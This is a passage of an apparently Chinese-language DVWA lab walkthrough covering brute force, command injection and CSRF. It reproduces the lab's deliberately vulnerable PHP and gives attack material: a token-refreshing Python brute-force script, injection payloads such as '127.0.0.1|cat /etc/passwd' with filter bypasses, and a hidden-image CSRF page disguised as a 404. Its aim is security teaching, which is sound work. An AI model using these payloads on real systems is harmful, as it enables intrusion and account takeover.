class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">'Login'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( $_REQUEST[ <span class="string">'user_token'</span> ], $_SESSION[ <span class="string">'session_token'</span> ], <span class="string">'index.php'</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitise username input</span></span><br><span class="line">    $user = $_GET[ <span class="string">'username'</span> ];</span><br><span class="line">    $user = stripslashes( $user );</span><br><span class="line">    $user = mysql_real_escape_string( $user );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitise password input</span></span><br><span class="line">    $pass = $_GET[ <span class="string">'password'</span> ];</span><br><span class="line">    $pass = stripslashes( $pass );</span><br><span class="line">    $pass = mysql_real_escape_string( $pass );</span><br><span class="line">    $pass = md5( $pass );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    $query  = <span class="string">"SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';"</span>;</span><br><span class="line">    $result = mysql_query( $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . mysql_error() . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( $result &amp;&amp; mysql_num_rows( $result ) == <span class="number">1</span> ) &#123;</span><br><span class="line">        <span class="comment">// Get users details</span></span><br><span class="line">        $avatar = mysql_result( $result, <span class="number">0</span>, <span class="string">"avatar"</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Login successful</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Welcome to the password protected area &#123;$user&#125;&lt;/p&gt;"</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;img src=\"&#123;$avatar&#125;\" /&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Login failed</span></span><br><span class="line">        sleep( rand( <span class="number">0</span>, <span class="number">3</span> ) );</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mysql_close();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>加入了token验证机制，我们每次登录时都必须提交一个token值，服务器将提交的token值与cookie或session中的token值对比,利用了<code>mysql_real_escape_string</code>函数对<code>$user</code>和<code>$pass</code>进行了转义处理，防止了<code>sql</code>注入 python脚本进行爆破</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> requests </span><br><span class="line"></span><br><span class="line"><span class="comment">#Cookie抓包填入</span></span><br><span class="line">header = &#123;</span><br><span class="line">    <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0'</span>,</span><br><span class="line">    <span class="string">'Cookie'</span>: <span class="string">'xxxx'</span></span><br><span class="line">&#125;</span><br><span class="line">url = <span class="string">"http://xxx/vulnerabilities/brute/index.php"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_token</span><span class="params">(url, header)</span>:</span></span><br><span class="line">    r = requests.get(url, headers = header) </span><br><span class="line">    html = r.content.decode() </span><br><span class="line">    soup = BeautifulSoup(html, <span class="string">"html.parser"</span>) </span><br><span class="line">    user_token =soup.find_all(<span class="string">'input'</span>)[<span class="number">3</span>][<span class="string">'value'</span>]<span class="comment"># 获取Token</span></span><br><span class="line">    <span class="keyword">return</span> user_token</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>: </span><br><span class="line">    u = get_token(url, header) </span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> open(<span class="string">'password.txt'</span>): </span><br><span class="line">        pwd = line.strip() </span><br><span class="line">        user = <span class="string">'admin'</span></span><br><span class="line">        payload = &#123;<span class="string">'username'</span>: user,<span class="string">'password'</span>: pwd,<span class="string">'Login'</span>: <span class="string">'Login'</span>,<span class="string">'user_token'</span>: u&#125;</span><br><span class="line">        response = requests.get(url, params = payload, headers = header)</span><br><span class="line">        res_len_b = len(response.content.decode())<span class="comment"># 格式化输出</span></span><br><span class="line">        <span class="keyword">if</span> i != <span class="number">0</span> <span class="keyword">and</span> res_len_b != res_len_a: </span><br><span class="line">            print(<span class="string">"%-3s %-6s %-10s %-8s"</span> %(i + <span class="number">1</span>, user, pwd, res_len_b)) </span><br><span class="line">            <span class="keyword">break</span> </span><br><span class="line">        print(<span class="string">"%-3s %-6s %-10s %-8s"</span> % (i + <span class="number">1</span>, user, pwd, res_len_b)) </span><br><span class="line">        res_len_a = res_len_b </span><br><span class="line">        u = get_token(url, header) </span><br><span class="line">        i += <span class="number">1</span></span><br></pre></td></tr></table></figure><h4 id="参考文章-2"><a href="#参考文章-2" class="headerlink" title="参考文章"></a>参考文章</h4><p>费星瑞博客：<a href="http://www.feixingrui.com/brute-force-dvwa.html" rel="external nofollow" target="_blank">brute-force-dvwa</a></p><h2 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h2><h3 id="前言-2"><a href="#前言-2" class="headerlink" title="前言"></a>前言</h3><h4 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h4><blockquote><p> stristr(string,search,before_search)</p></blockquote><p><code>stristr</code>函数搜索字符串在另一字符串中的第一次出现，返回字符串的剩余部分（从匹配点），如果未找到所搜索的字符串，则返回 FALSE</p><table><thead><tr><th>参数</th><th style="text-align:center">描述</th></tr></thead><tbody><tr><td>string</td><td style="text-align:center">必需。规定被搜索的字符串。</td></tr><tr><td>search</td><td style="text-align:center">必需。规定要搜索的字符串。</td></tr><tr><td>如果该参数是数字，则搜索匹配该数字对应的 ASCII 值的字符。</td><td style="text-align:center"></td></tr><tr><td>before_search</td><td style="text-align:center">可选。默认值为 “false” 的布尔值。</td></tr><tr><td>如果设置为 “true”，它将返回 search 参数第一次出现之前的字符串部分。</td></tr></tbody></table><blockquote><p>php_uname() 返回了运行 PHP 的操作系统的描述</p></blockquote><table><thead><tr><th>参数</th><th style="text-align:center">描述</th></tr></thead><tbody><tr><td>”a”</td><td style="text-align:center">（此为默认，包含序列”s n r v m”里的所有模式）</td></tr><tr><td>”s ”</td><td style="text-align:center">（返回操作系统名称）</td></tr><tr><td>”n”</td><td style="text-align:center">（返回主机名）</td></tr><tr><td>” r”</td><td style="text-align:center">（返回版本名称）</td></tr><tr><td>”v”</td><td style="text-align:center">（返回版本信息）</td></tr><tr><td>”m”</td><td style="text-align:center">（返回机器类型）。</td></tr></tbody></table><p>可以看到，服务器通过判断操作系统执行不同ping命令，但是对ip参数并未做任何的过滤，导致了严重的命令注入漏洞</p><p>命令执行漏洞概念：当web应用程序需要调用一些外部程序去处理内容的情况下，就会用到一些执行系统命令的函数 在远程服务器上执行任意系统命令</p><p><a href="https://www.cnblogs.com/xiaozi/p/7831529.html" rel="external nofollow" target="_blank">命令执行漏洞</a></p><h4 id="常用命令执行函数"><a href="#常用命令执行函数" class="headerlink" title="常用命令执行函数"></a>常用命令执行函数</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">exec()、system()、popen()、passthru()、proc_open()、pcntl_exec()、shell_exec() 、反引号` 实际上是使用shell_exec()函数</span><br><span class="line"></span><br><span class="line">system() 输出并返回最后一行shell结果。</span><br><span class="line">exec() 不输出结果，返回最后一行shell结果，所有结果可以保存到一个返回的数组里面。</span><br><span class="line">passthru() 只调用命令，把命令的运行结果原样地直接输出到标准输出设备上。</span><br></pre></td></tr></table></figure><h4 id="漏洞利用及绕过姿势"><a href="#漏洞利用及绕过姿势" class="headerlink" title="漏洞利用及绕过姿势"></a>漏洞利用及绕过姿势</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">| 命令管道符</span><br><span class="line">&lt;&gt;&gt;&gt; 文件重定向符</span><br><span class="line">测试： 0 | dir c:</span><br><span class="line">代码只过滤了部分特殊字符，可以考虑用其他字符进行测试，这边列举一下Window/Linux可利用的特殊字符：</span><br></pre></td></tr></table></figure><h4 id="windows支持：di"><a href="#windows支持：di" class="headerlink" title="windows支持：di"></a>windows支持：di</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">|     直接执行后面的语句      ping 127.0.0.1|whoami</span><br><span class="line">||    前面出错执行后面的 ，前面为假       ping  127.0.0.1 || whoami</span><br><span class="line">&amp;     前面的语句为假则直接执行后面的,前面可真可假       ping 127.0.0.1&amp;whoami</span><br><span class="line">&amp;&amp;    前面的语句为假则直接出错，后面的也不执行，前面只能为真    ping 127.0.0.1&amp;&amp;whoami</span><br></pre></td></tr></table></figure><h4 id="Linux支持："><a href="#Linux支持：" class="headerlink" title="Linux支持："></a>Linux支持：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">;     前面的执行完执行后面的      ping 127.0.0.1;whoami</span><br><span class="line">|     管道符，显示后面的执行结果   ping 127.0.0.1|whoami</span><br><span class="line">ll    当前面的执行出错时执行后面的   ping 1||whoami</span><br><span class="line">&amp;     前面的语句为假则直接执行后面的,前面可真可假                       ping 127.0.0.1&amp;whoami</span><br><span class="line">&amp;&amp;    前面的语句为假则直接出错，后面的也不执行，前面只能为真    ping 127.0.0.1&amp;&amp;whoami</span><br></pre></td></tr></table></figure><h3 id="low级别-2"><a href="#low级别-2" class="headerlink" title="low级别"></a>low级别</h3><p>代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'Submit'</span> ]  ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $target = $_REQUEST[ <span class="string">'ip'</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Determine OS and execute the ping command.</span></span><br><span class="line">    <span class="keyword">if</span>( stristr( php_uname( <span class="string">'s'</span> ), <span class="string">'Windows NT'</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// Windows</span></span><br><span class="line">        $cmd = shell_exec( <span class="string">'ping  '</span> . $target );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// *nix</span></span><br><span class="line">        $cmd = shell_exec( <span class="string">'ping  -c 4 '</span> . $target );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for the end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>未过滤特殊字符</p><ul><li>payload</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1|cat /etc/passwd</span><br><span class="line">127.0.0.1&amp;cat /etc/passwd</span><br></pre></td></tr></table></figure><h3 id="medium级别-3"><a href="#medium级别-3" class="headerlink" title="medium级别"></a>medium级别</h3><p>代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'Submit'</span> ]  ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $target = $_REQUEST[ <span class="string">'ip'</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Set blacklist</span></span><br><span class="line">    $substitutions = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">'&amp;&amp;'</span> =&gt; <span class="string">''</span>,</span><br><span class="line">        <span class="string">';'</span>  =&gt; <span class="string">''</span>,</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Remove any of the charactars in the array (blacklist).</span></span><br><span class="line">    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Determine OS and execute the ping command.</span></span><br><span class="line">    <span class="keyword">if</span>( stristr( php_uname( <span class="string">'s'</span> ), <span class="string">'Windows NT'</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// Windows</span></span><br><span class="line">        $cmd = shell_exec( <span class="string">'ping  '</span> . $target );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// *nix</span></span><br><span class="line">        $cmd = shell_exec( <span class="string">'ping  -c 4 '</span> . $target );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for the end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>str_replace()</code> 函数替换字符串中的一些字符（区分大小写）</p><blockquote><p>str_replace(find,replace,string,count)</p></blockquote><table><thead><tr><th>参数</th><th style="text-align:center">描述</th></tr></thead><tbody><tr><td>find</td><td style="text-align:center">必需。规定要查找的值。</td></tr><tr><td>replace</td><td style="text-align:center">必需。规定替换 find 中的值的值。</td></tr><tr><td>string</td><td style="text-align:center">必需。规定被搜索的字符串。</td></tr><tr><td>count</td><td style="text-align:center">可选。一个变量，对替换数进行计数。</td></tr></tbody></table><p><code>array_keys()</code>函数返回包含数组中所有键名的一个新数组</p><blockquote><p>array_keys(array,value,strict)</p></blockquote><table><thead><tr><th>参数</th><th style="text-align:center">描述</th></tr></thead><tbody><tr><td>array</td><td style="text-align:center">必需。规定数组。</td></tr><tr><td>value</td><td style="text-align:center">可选。您可以指定键值，然后只有该键值对应的键名会被返回。</td></tr><tr><td>strict</td><td style="text-align:center">可选。与 value 参数一起使用。可能的值：</td></tr><tr><td>true - 返回带有指定键值的键名。依赖类型，数字 5 与字符串 “5” 是不同的。</td><td style="text-align:center"></td></tr><tr><td>false - 默认值。不依赖类型，数字 5 与字符串 “5” 是相同的。</td></tr></tbody></table><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">”&amp;&amp;”与” &amp;”的区别：</span><br><span class="line"></span><br><span class="line">Command 1&amp;&amp;Command 2</span><br><span class="line">先执行Command 1，执行成功后执行Command 2，否则不执行Command 2</span><br><span class="line"></span><br><span class="line">Command 1&amp;Command 2</span><br><span class="line">先执行Command 1，不管是否成功，都会执行Command 2</span><br></pre></td></tr></table></figure><ul><li>payload</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">过滤了&amp;&amp; ;将他们替换成了空</span><br><span class="line">127.0.0.1|whoami</span><br><span class="line">127.0.0.1&amp;whoami</span><br><span class="line">127.0.0.1&amp;;&amp;whoami</span><br></pre></td></tr></table></figure><h3 id="high级别-3"><a href="#high级别-3" class="headerlink" title="high级别"></a>high级别</h3><p>代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'Submit'</span> ]  ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $target = trim($_REQUEST[ <span class="string">'ip'</span> ]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Set blacklist</span></span><br><span class="line">    $substitutions = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">'&amp;'</span>  =&gt; <span class="string">''</span>,</span><br><span class="line">        <span class="string">';'</span>  =&gt; <span class="string">''</span>,</span><br><span class="line">        <span class="string">'| '</span> =&gt; <span class="string">''</span>,</span><br><span class="line">        <span class="string">'-'</span>  =&gt; <span class="string">''</span>,</span><br><span class="line">        <span class="string">'$'</span>  =&gt; <span class="string">''</span>,</span><br><span class="line">        <span class="string">'('</span>  =&gt; <span class="string">''</span>,</span><br><span class="line">        <span class="string">')'</span>  =&gt; <span class="string">''</span>,</span><br><span class="line">        <span class="string">'`'</span>  =&gt; <span class="string">''</span>,</span><br><span class="line">        <span class="string">'||'</span> =&gt; <span class="string">''</span>,</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Remove any of the charactars in the array (blacklist).</span></span><br><span class="line">    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Determine OS and execute the ping command.</span></span><br><span class="line">    <span class="keyword">if</span>( stristr( php_uname( <span class="string">'s'</span> ), <span class="string">'Windows NT'</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// Windows</span></span><br><span class="line">        $cmd = shell_exec( <span class="string">'ping  '</span> . $target );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// *nix</span></span><br><span class="line">        $cmd = shell_exec( <span class="string">'ping  -c 4 '</span> . $target );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for the end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>黑名单看似过滤了所有的非法字符，但仔细观察到是把”| ”（注意这里|后有一个空格）替换为空字符</p><ul><li>payload</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1|whoami</span><br></pre></td></tr></table></figure><p><code>stripslashes()</code> 函数删除由 <code>addslashes()</code> 函数添加的反斜杠<br><code>stripslashes</code>函数会删除字符串中的反斜杠，返回已剥离反斜杠的字符串<br> explode() 函数把字符串打散为数组</p><table><thead><tr><th>参数</th><th style="text-align:center">描述</th></tr></thead><tbody><tr><td>separator</td><td style="text-align:center">必需。规定在哪里分割字符串。</td></tr><tr><td>string</td><td style="text-align:center">必需。要分割的字符串。</td></tr><tr><td>limit</td><td style="text-align:center">可选。规定所返回的数组元素的数目</td></tr></tbody></table><p>is_numeric(string)<br> 检测string是否为数字或数字字符串，如果是返回TRUE，否则返回FALSE。</p><p>参考文章：<a href="https://www.jianshu.com/p/bfe982497cdc" rel="external nofollow" target="_blank">dvwa-Command Injection</a></p><h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a><em>CSRF</em></h2><h3 id="前言-3"><a href="#前言-3" class="headerlink" title="前言"></a>前言</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">CSRF，全称Cross-site request forgery，翻译过来就是跨站请求伪造，是指利用受害者尚未失效的身份认证信息（cookie、会话等），诱骗其点击恶意链接或者访问包含攻击代码的页面，在受害人不知情的情况下以受害者的身份向（身份认证信息所对应的）服务器发送请求，从而完成非法操作（如转账、改密等）。CSRF与XSS最大的区别就在于，CSRF并没有盗取cookie而是直接利用</span><br><span class="line"></span><br><span class="line">CSRF最关键的是利用受害者的cookie向服务器发送伪造请求，所以如果受害者之前用Chrome浏览器登录的这个系统，而用搜狗浏览器点击这个链接，攻击是不会触发的，因为搜狗浏览器并不能利用Chrome浏览器的cookie，所以会自动跳转到登录界面。</span><br></pre></td></tr></table></figure><h3 id="low级别-3"><a href="#low级别-3" class="headerlink" title="low级别"></a>low级别</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">'Change'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $pass_new  = $_GET[ <span class="string">'password_new'</span> ];</span><br><span class="line">    $pass_conf = $_GET[ <span class="string">'password_conf'</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Do the passwords match?</span></span><br><span class="line">    <span class="keyword">if</span>( $pass_new == $pass_conf ) &#123;</span><br><span class="line">        <span class="comment">// They do!</span></span><br><span class="line">        $pass_new = mysql_real_escape_string( $pass_new );</span><br><span class="line">        $pass_new = md5( $pass_new );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Update the database</span></span><br><span class="line">        $insert = <span class="string">"UPDATE `users` SET password = '$pass_new' WHERE user = '"</span> . dvwaCurrentUser() . <span class="string">"';"</span>;</span><br><span class="line">        $result = mysql_query( $insert ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . mysql_error() . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for the user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Password Changed.&lt;/pre&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Issue with passwords matching</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Passwords did not match.&lt;/pre&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mysql_close();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>检查参数<code>password_new</code>与<code>password_conf</code>是否相同，如果相同，就会修改密码，并没有任何的防<code>CSRF</code>机制</p><ul><li>漏洞利用</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.直接让受害者点击链接</span><br><span class="line">http://xxx/vulnerabilities/csrf/?password_new=1&amp;password_conf=1&amp;Change=Change#</span><br><span class="line">2.短链接来隐藏URL</span><br><span class="line">3.构造攻击页面,代码如下</span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"http://xxxx/dvwa/vulnerabilities/csrf/?password_new=hack&amp;password_conf=hack&amp;Change=Change#"</span> <span class="attr">border</span>=<span class="string">"0"</span> <span class="attr">style</span>=<span class="string">"display:none;"</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>404<span class="tag">&lt;<span class="name">h1</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>file not found.<span class="tag">&lt;<span class="name">h2</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="medium级别-4"><a href="#medium级别-4" class="headerlink" title="medium级别"></a>medium级别</h3><p>代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">'Change'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Checks to see where the request came from</span></span><br><span class="line">    <span class="keyword">if</span>( eregi( $_SERVER[ <span class="string">'SERVER_NAME'</span> ], $_SERVER[ <span class="string">'HTTP_REFERER'</span> ] ) ) &#123;</span><br><span class="line">        <span class="comment">// Get input</span></span><br><span class="line">        $pass_new  = $_GET[ <span class="string">'password_new'</span> ];</span><br><span class="line">        $pass_conf = $_GET[ <span class="string">'password_conf'</span> ];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Do the passwords match?</span></span><br><span class="line">        <span class="keyword">if</span>( $pass_new == $pass_conf ) &#123;</span><br><span class="line">            <span class="comment">// They do!</span></span><br><span class="line">            $pass_new = mysql_real_escape_string( $pass_new );</span><br><span class="line">            $pass_new = md5( $pass_new );</span><br><span 